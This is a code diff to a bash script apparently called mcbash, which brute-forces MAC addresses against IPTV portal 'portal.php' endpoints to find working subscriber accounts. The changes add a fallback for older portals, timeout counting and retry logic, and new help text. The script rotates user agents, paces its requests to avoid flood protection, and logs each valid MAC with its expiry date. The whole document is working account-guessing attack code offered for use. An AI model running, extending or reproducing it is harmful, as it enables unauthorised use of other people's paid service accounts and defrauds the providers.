@@ -1,6 +1,9 @@
 #!/bin/bash
 #
 
+# TODO :
+# 1) add option to select MAC format (--format); e.g. AA:BB:CC:xx:xx:xx
+
 _RED=$(tput setaf 1)
 _GREEN=$(tput setaf 2)
 _YELLOW=$(tput setaf 3)
@@ -23,7 +26,7 @@ else
 	if [[ -f "/etc/mcbash.conf" ]]; then
 		source "/etc/mcbash.conf"
 	else
-		echo -e "Config file not found.\nmcbash.conf should be placed here : $config_file"
+		echo -e "Config file not found. This can cause weird behaviors.\nmcbash.conf should be placed here : $config_file"
 	fi
 fi
 
@@ -32,7 +35,7 @@ fi
 
 # Check arguments
 args=("$@")
-ELEMENTS=${#args[@]} # arguments number
+ELEMENTS=${#args[@]}
 for (( i=0;i<$ELEMENTS;i++)); do
 	[[ $(echo ${args[${i}]}) == "-np" || \
 		$(echo ${args[${i}]}) == "--default" ]] && \
@@ -82,12 +85,12 @@ for (( i=0;i<$ELEMENTS;i++)); do
 		range_to=${args[${argument_range_to}]}
 	[[ $(echo ${args[${i}]}) == "-h" || $(echo ${args[${i}]}) == "--help" ]] && \
 		echo -e "${_BOLD}Help menu :${_RESET} \
-		\n -b ${_BLUE}X ${_RESET}: Make a break every ${_BLUE}X${_RESET} requests \
-		\n -d ${_BLUE}X ${_RESET}: Break duration (${_BLUE}X${_RESET} seconds) \
-		\n -s ${_BLUE}X ${_RESET}: Stop McBash after ${_BLUE}X${_RESET} tested MAC addresses \
-		\n -t ${_BLUE}X ${_RESET}: Consider request a timeout after ${_BLUE}X${_RESET} seconds \
-		\n -u ${_BLUE}URL ${_RESET}: Server ${_BLUE}URL/IP${_RESET} (specifying -u is not mandatory) \
-		\n -w ${_BLUE}X ${_RESET}: Wait ${_BLUE}X${_RESET} seconds between each requests \
+		\n -b ${_BLUE}X${_RESET} : Make a break every ${_BLUE}X${_RESET} requests \
+		\n -d ${_BLUE}X${_RESET} : Break or timeout duration (${_BLUE}X${_RESET} seconds) \
+		\n -s ${_BLUE}X${_RESET} : Stop McBash after ${_BLUE}X${_RESET} tested MAC addresses \
+		\n -t ${_BLUE}X${_RESET} : Consider request a timeout after a delay of ${_BLUE}X${_RESET} seconds \
+		\n -u ${_BLUE}URL:port${_RESET} : Server ${_BLUE}URL/IP${_RESET} and ${_BLUE}port (optional)${_RESET} (specifying -u is not mandatory) \
+		\n -w ${_BLUE}X${_RESET} : Wait ${_BLUE}X${_RESET} seconds between each requests \
 		\n -k : Store expired MAC addresses (valid but expired accounts) \
 		\n --range : Scan a range of MAC addresses sequentially \
 		\n -np : Parameters by default \
@@ -95,7 +98,8 @@ for (( i=0;i<$ELEMENTS;i++)); do
 		\n man mcbash : Look up the manual for more tweaks \
 		\n \
 		\n ${_BOLD}Example ${_RESET}: mcbash -u my-dns.com:8080 -w 1.5 -b 10 -d 3 -s 150 -t 2 -k
-		\n Set default parameters from this file : \"$HOME/.mcbash/mcbash.conf\"\
+		\n Set your default parameters inside this file : \"$HOME/.mcbash/mcbash.conf\"\
+		\n MACs are stored here : \"$HOME/.mcbash/\"\
 		" && exit 0
 done
 
@@ -206,43 +210,59 @@ range_mac() {
 }
 
 handshaking() {
-	item=$(( $item + 1 ))
-	[[ -v stopping ]] && [[ $(( $item - 1 )) == $stopping ]] && echo ${_BOLD}${_CYAN}"$(( $item - 1 )) checked, $valid_macs_number valid. Stopping."${_RESET} && exit 0
-	[[ $item == 1 ]] || ( [[ -v timebreak ]] \
-		&& [[ $(expr $(( $item - 1 )) % $timebreak ) == 0 ]] \
-		&& echo -ne ${_BLUE}"\r[$(( $item - 1 ))] $mac ${_RESET}${_CYAN}--- Break. $timebreak_duration seconds..."${_RESET} \
-		&& sleep $timebreak_duration ) || \
-		sleep $request_delay
-	[[ -v range ]] && range_mac
-	[[ ! -v range ]] && random_mac
+	if [[ -v last_request_timedout ]]; then
+		unset last_request_timedout
+	else
+		item=$(( $item + 1 ))
+		[[ -v stopping ]] && [[ $(( $item - 1 )) == $stopping ]] && echo ${_BOLD}${_CYAN}"$(( $item - 1 )) checked, $valid_macs_number valid. Stopping."${_RESET} && exit 0
+		[[ $item == 1 ]] || ( [[ -v timebreak ]] \
+			&& [[ $(expr $(( $item - 1 )) % $timebreak ) == 0 ]] \
+			&& echo -ne ${_BLUE}"\r[$(( $item - 1 ))] $mac ${_RESET}${_CYAN}--- Pausing for $timebreak_duration seconds..."${_RESET} \
+			&& sleep $timebreak_duration ) || \
+			sleep $request_delay
+		[[ -v range ]] && range_mac
+		[[ ! -v range ]] && random_mac
+	fi
 	handshake_url=$(echo $dns)'/portal.php?action=handshake&type=stb&token=&mac='$(echo $encoded_mac)
 	cookie="mac=$mac; stb_lang=en; timezone=Europe/Amsterdam; "
 	random_user_agent
-	handshake_token=$(curl --max-time $timeout -s -X GET -H "Accept: */*" -H "User-Agent: $(echo $user_agent)" -H "Cookie: $(echo $cookie)" "$(echo $handshake_url)"); if [ $? -eq 28 ]; then echo -ne "\r\033[0KTimeout. Server may protect against flood (we respect it). New attempt in $timebreak_duration seconds." && sleep $timebreak_duration && echo -ne "\r\033[0KNew attempt..." && return; fi
+	handshake_token=$(curl --max-time $timeout -s -X GET -H "Accept: */*" -H "User-Agent: $(echo $user_agent)" -H "Cookie: $(echo $cookie)" "$(echo $handshake_url)"); if [ $? -eq 28 ]; then timeout_number=$(( $timeout_number + 1 )) && last_request_timedout=true && echo -ne "\r\033[0KTimeout [$timeout_number]. New attempt in $timebreak_duration seconds." && sleep $timebreak_duration && echo -ne "\r\033[0K\r\033[0KNew attempt..." && return; fi
 	handshake_token=$(echo $handshake_token| grep -o '"token".*' | sed 's/\"token\":// ; s/\}\}//')
 	[[ $handshake_token = "" ]] && echo -ne "\r\033[0K$@${_YELLOW}[$item]${_RESET} ${_RED}$mac ${_RESET}" && return # [empty]
 	[[ $(echo $handshake_token | grep null) ]] && echo -ne "\r\033[0K$@${_YELLOW}[$item]${_RESET} ${_RED}$mac ${_RESET}" && return # [empty]
 	authorization='Bearer '$(echo $handshake_token)
 	profile_url=$(echo $dns)'/portal.php?type=account_info&action=get_main_info&mac='$(echo $mac)
 	profile=$(curl --max-time $timeout -s -X GET -H "Accept: */*" -H "User-Agent: $(echo $user_agent)" -H "Authorization: $(echo $authorization)" -H "Cookie: $(echo $cookie)" "$(echo $profile_url)")
-	[[ $profile == "" ]] && echo -ne "\r\033[0K$@${_YELLOW}[$item]${_RESET} ${_RED}$mac ${_RESET}" && return # test
+	[[ $profile == "" ]] && \
+		maybeGEN1portal=true && \
+		profile_url=$(echo $dns)'/portal.php?type=stb&action=get_profile&JsHttpRequest=1-xml='$(echo $mac) && \
+		profile=$(curl --max-time $timeout -s -X GET -H "Accept: */*" -H "User-Agent: $(echo $user_agent)" -H "Authorization: $(echo $authorization)" -H "Cookie: $(echo $cookie)" "$(echo $profile_url)")
+	[[ $profile == "" ]] && unset maybeGEN1portal && echo -ne "\r\033[0K$@${_YELLOW}[$item]${_RESET} ${_RED}$mac ${_RESET}" && return # test
+	[[ -v maybeGEN1portal ]] && \
+		account_url=$(echo $dns)'/portal.php?type=account_info&action=get_main_info&mac='$(echo $mac) && \
+		account=$(curl --max-time $timeout -s -X GET -H "Accept: */*" -H "User-Agent: $(echo $user_agent)" -H "Authorization: $(echo $authorization)" -H "Cookie: $(echo $cookie)" "$(echo $account_url)") && \
+		[[ ! $account == "" ]] && \
+		profile=$account
 	expiration_date=$(echo $profile | grep -o "\"phone\":\".*\"" | sed 's/\"phone\":\"//' | sed 's/\".*//')
-	[[ $expiration_date == "" ]] && \
-		( ( [[ ! -v keep_expired ]] && echo -ne "\r${_YELLOW}[$item]${_RESET} ${_BOLD}${_RED}$mac [expired] ${_RESET}" && return ) || \
-			( echo -ne "\r${_YELLOW}[$item]${_RESET} ${_BOLD}${_RED}$mac [expired] ${_RESET}\n" && \
-			name=$(echo $dns | sed 's/http:\/\///' | sed 's/://;s/\///') && \
-			echo "$mac [expired]" >> $destination/valid_macs_$name ) )
-	name=$(echo $dns | sed 's/http:\/\///' | sed 's/://;s/\///')
+	[[ -z $expiration_date && ! -v keep_expired ]] && \
+		echo -ne "\r${_YELLOW}[$item]${_RESET} ${_BOLD}${_RED}$mac [expired] ${_RESET}" && \
+		return
+	[[ -z $expiration_date && -v keep_expired ]] && \
+		echo -ne "\r${_YELLOW}[$item]${_RESET} ${_BOLD}${_RED}$mac [expired] ${_RESET}\n" && \
+		( if [[ $valid_macs_number == 0 ]]; then echo -e "\n$dns ($(date))\n" >> $destination/valid_macs_$name; fi ) && \
+		echo "$mac [expired]" >> $destination/valid_macs_$name && \
+		return
 	[[ $valid_macs_number == 0 ]] && echo -e "\n$dns ($(date))\n" >> $destination/valid_macs_$name
 	echo "$mac [$expiration_date]" >> $destination/valid_macs_$name
-	echo -ne "\r${_BOLD}${_GREEN}[$item] $mac [VALID!] ${_RESET}\n"
+	echo -ne "\r${_BOLD}${_GREEN}[$item] $mac ${_RESET}${_RED}[$expiration_date] ${_RESET}\n"
 	valid_macs_number=$(( $valid_macs_number + 1 ))
+	unset maybeGEN1portal
 }
 
 quit_mcbash() {
 	echo ""
 	[[ $valid_macs_number != 0 ]] && echo ${_GREEN}"$valid_macs_number valid for $(( $item - 1 )) tested." ${_RESET}
-	echo ${_CYAN}--- Break ---${_RESET}
+	echo ${_CYAN}--- You have paused mcbash. What to do ? ---${_RESET}
 	trap - SIGINT
 	read -p "${_BOLD}${_MAGENTA}Quit [Ctrl+C]  ${_RESET}-  ${_BOLD}${_BLUE}Resume [Enter]${_RESET} " quit_mc
 	( [[ $(echo $quit_mc | grep -io "y") ]] && \
@@ -265,8 +285,11 @@ parameters
 
 echo "${_BOLD}=> ${_RESET}Scan @ ${_BOLD}${_BLUE}$dns${_RESET} ${_GREEN}[$request_delay seconds/request]${_RESET}"
 
+name=$(echo $dns | sed 's/http:\/\///' | sed 's/://;s/\///')
+
 item=0
 valid_macs_number=0
+timeout_number=0
 stty -echoctl # Hide ^C when pressing Ctrl+C
 
 # Let's go !
@@ -283,4 +306,4 @@ done
 
 # dougy147 [2022]
 # https://github.com/dougy147/mcbash
-# last updated : 03oct2022
+# last updated : 30nov2022
